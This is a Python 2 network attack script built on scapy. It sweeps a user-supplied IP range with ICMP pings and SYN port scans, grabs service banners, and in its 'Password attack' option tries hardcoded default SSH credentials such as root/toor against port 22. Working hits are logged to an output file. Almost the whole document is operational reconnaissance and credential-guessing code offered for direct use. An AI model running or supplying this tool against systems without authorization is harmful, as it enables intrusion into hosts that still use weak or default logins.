#! /usr/bin/python

from logging import getLogger, ERROR 
getLogger("scapy.runtime").setLevel(ERROR) 
from scapy.all import * 
import sys 
from datetime import datetime 
from time import strftime
import socket
from netaddr import IPNetwork
from scssh import connectsh 
import threading


#Thread worker
class myThread (threading.Thread):
    def __init__(self,pingY,ports,grabbing,brpass,file_out,ips,threadLock,threadLock2):
        threading.Thread.__init__(self)
	self.lock= threadLock
	self.lock2= threadLock2
	self.pingY=pingY
	self.grabbing=grabbing
	self.brpass=brpass
	self.file_out=file_out	
	self.ports=ports

    def run(self):
	global ipnum
	global file_out
	global SYNACK
	global RSTACK

        #while to get target address and analize
        while True:
		self.lock.acquire(0)
        	try:
			count = ipnum  
			ipnum = ipnum + 1
        # Free lock to release next thread
		finally:
        		self.lock.release()
		if (count>len(ips)-1):
        		break
 	        print "Analicing ip  "+ str(ips[count]) + " " + self.name
		gogo(ips[count],self.pingY,self.grabbing,self.brpass,self.file_out,self.lock2,self.ports)



def yes_or_no(question): #tp check yes or no questions
    reply = str(raw_input(question+' (y/n): ')).lower().strip()
    if reply[0] == 'y':
        return True
    if reply[0] == 'n':
        return False
    else:
        return yes_or_no(question)

def checkhost(ip): # Check host with icmp
	conf.verb = 0 # Hide output
	try:
		ping = sr1(IP(dst = ip)/ICMP(),timeout=0.6) 
		
		if not (ping is None):
         		#print ip, "is online"
    			return True
		else:
         		#print ip, "Timeout waiting"
		        #print "[!] Exiting..."
			return False
		        
	except KeyboardInterrupt: # In case the user wants to quit
        	print "\n[*] User Requested Shutdown..."
        	print "[*] Exiting..."
       		sys.exit(1)



def scanport(port,target): # Scan if port is open with Syn scan

	try:
		srcport = RandShort() 
		conf.verb = 0 # Hide output

		SYNACKpkt = sr1(IP(dst = target)/TCP(sport = srcport, dport = port, flags = "S"),timeout=float(portTimeout)) # Send syn packet
		if not (SYNACKpkt is None):
			pktflags = SYNACKpkt.getlayer(TCP).flags 
			if pktflags == SYNACK: # if we have a syn ack--> port open
                        
                        	return True 
                                    
			else:
				return False # Else port closed
			RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
			send(RSTpkt) # Send RST packet
		else:
			return False
	except KeyboardInterrupt: # In case the user needs to quit
		RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R") 
		send(RSTpkt) # Send RST packet
		print "\n[*] User Requested Shutdown..."
		print "[*] Exiting..."
		sys.exit(1)
	except Exception, e:
		#print str(e) +" "+target+":"+str(port)
		pass	

def conn(targetHost, targetPort): ##Connect to ports to grab info

    password=","	
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((targetHost, targetPort))
        #print '[+] Connection to ' + targetHost + ' port ' + str(targetPort) + ' succeeded!'
 	grabber=""
        if (targetPort == 80) or (targetPort == 443):
            grabber=grabHTTP(conn)
        elif (targetPort == 22):
	    grabber=grab(conn)
	    #Future better implementation of 22 grab
	
	else:
            grabber=grab(conn)
    
    	return(grabber.replace('\n', ' ').replace('\r', ''))

    except Exception, e:
        pass #print '[-] Connection to ' + targetHost + ' port ' + str(targetPort) + ' failed: ' + str(e)
    finally:
        conn.close()



def grab(conn): # to receive a banner
  conn.settimeout(3)
  #setblocking(FALSE)
  count = 0
  msg = ""
  while (count < 2):
    try:
	conn.send('Hello')
        msg = conn.recv(1024)
    except (socket.timeout, socket.gaierror):
        # Something else happened, handle error
        print 'Error on socket'
	count = count + 1
    else:
        if len(msg) == 0:
            print 'orderly shutdown on server end'
            count = 3
        else:
            #print '[+]' + str(msg)
	    count = 3	

  conn.settimeout(0.3)
  return str(msg) 



def grabHTTP(conn): #http baner grab, need improvements
    conn.settimeout(3)
    ret='Failed Connection'
    count = 0;
    try:
    	   	conn.send('GET  HTTP/1.1 \r\n')
        	ret = conn.recv(1024)
        	#print '[+]' + str(ret)

    except Exception, e:
        	#print '[-] Unable to grab any information: ' + str(e)
		pass
		
    return str(ret)

def attack22(conn): ## to probe passwords on 22,improvements needed
	user= ["root","root","root","admin"]
	passwd= ["toor","pass","r00t","passwd"]

	for count in range(len(user)):
		try:
			#print "attack " + user[count] +" "+ passwd[count]
			attack = connectsh(user[count],conn,passwd[count])
		except Exception, e:
			attack = False
		if not attack:
			uspass = ','
		else:
		        uspass= user[count] + ',' + passwd[count]
			break

	return uspass

def writter(str,lock2):
    
    while True:	
    		haveIt = lock2.acquire(0)
    		try:
                	if haveIt:       
       				with open(file_out, "a") as myfile:
             				myfile.write(str + '\n')
				break
    
    		finally:
			if haveIt:
        			lock2.release()




# To start scan
def gogo(ip,pingY,grabbing,brpass,file_out,lock2,ports):
     target = str(ip)
     	
     if (pingY) :	
	if (checkhost(target)): # Run checkhost() function from earlier

	  for port in ports: # Iterate through range of ports
		result=""
		status = scanport(port,target) # Feed each port into scanning function
		if status == True: # Test result 
			#print "Port " + str(port) + ": Open" # Print status
			result = str(target) + ',' + str(port) 
			if not grabbing:
 				result = str(result) + ',,' 
			else:
			        result = result + ',' + str(conn(target,port))
			if not brpass:
				result = result + ',,'
			else:
				if(port==22):
					password =attack22(target)
					result = result + ',' + password
                                else:
					result = result + ',,'

			writter(result,lock2)
			
		else:
			pass
     else:
	  for port in ports: # Iterate through range of ports
                result='closed'
                status = scanport(port,target) # Feed each port into scanning function
                if status == True: # Test result
                        #print "Port " + str(port) + ": Open" # Print status
                        result = str(target) + ',' + str(port)
                        if not grabbing:
                                result = result + ',,'
                        else:
                                result = result + ',' +str(conn(target,port))
                        if not brpass:
                                result = result + ',,'
                        else:
                                if(port==22):
                                        password =attack22(target)
                                        result = result + ',' + password
                                else:
                                        result = result + ',,'

                        writter(result,lock2)
			
                else:
                        pass
		

     	



########PROGRAM INI#############

def main():

        global ipnum
	global ips
	global portTimeout
        
	global file_out
	global SYNACK
	global RSTACK


	try:
        	targetThreads = raw_input("[*] Enter Number of Concurrent Proceses: ") # Get Target Address
        	portTimeout = raw_input("[*] Enter Port Scan Timeout, depends on network: ") # Get Target Address 
		targetCDIR = raw_input("[*] Enter Target IP Address: ") # Get Target Address
        	pingY = yes_or_no("[*] Rely on ICMP for host detection?")
		defPorts = yes_or_no("[*] Use default ports")
        	if not defPorts:
			min_port = raw_input("[*] Enter Minumum Port Number: ") # Get Min. Port Num.
        		max_port = raw_input("[*] Enter Maximum Port Number: ") # Get Max. Port Num.
        		try:
                		if int(min_port) >= 0 and int(max_port) >= 0 and int(max_port) >= int(min_port): # Test for valid range of ports
                        		pass
                		else: # If range didn't raise error, but didn't meet criteria
                        		print "\n[!] Invalid Range of Ports"
                        		print "[!] Exiting..."
                        		sys.exit(0)
        		except Exception: # If input range raises an error
                		print "\n[!] Invalid Range of Ports"
                		print "[!] Exiting..."
                		sys.exit(0)
		grabbing = yes_or_no("[*] Execute banner grabbing")
		brpass = yes_or_no("[*] Password attack")
		file_out = raw_input("[*] Enter file to write: ")
	except KeyboardInterrupt: # In case the user wants to quit
        	print "\n[*] User Requested Shutdown..."
        	print "[*] Exiting..."
        	sys.exit(1)

	if not defPorts:
		ports = range(int(min_port), int(max_port)+1) # Build range from given port numbers
	else:
		ports = [11,13,17,18,20,21,22,23,25,37,42,49,53,54,80,88,90,107,111,115,119,123,135,137,139,143,153,156,161,162,179,194,201,220,264,389,443,445,464,465,500,513,514,520,521,543,544,546,547,554,563,631,636,751,808,829,860,873,902,903,944,989,990,992,993,3306,3389,5666,5900,5901,8080,8081,8443]


	start_clock = datetime.now() # Start clock for scan time
	SYNACK = 0x12 # Set flag values for later reference
	RSTACK = 0x14


	ipnum=0
	ips= IPNetwork(targetCDIR)
	threadLock = threading.Lock()
	threadLock2 = threading.Lock()
	#threadLock = BoundedSemaphore()
	threads = []
	tr=1

	print "[*] Scanning Started at " + strftime("%H:%M:%S") + "!\n" # Confirm scan start

	while tr < (int(targetThreads)+1):
		trt = myThread(pingY,ports,grabbing,brpass,file_out,ips,threadLock,threadLock2)
		trt.start()
        	threads.append(trt)
		tr=tr+1

	for t in threads:
    		t.join()
		print "Exiting Main Thread"


 	stop_clock = datetime.now() # Stop clock for scan time
	total_time = stop_clock - start_clock # Calculate scan time
	print "\n[*] Scanning Finished!" # Confirm scan stop
	print "[*] Total Scan Duration: " + str(total_time) # Print scan time





if __name__ == "__main__":
    main()
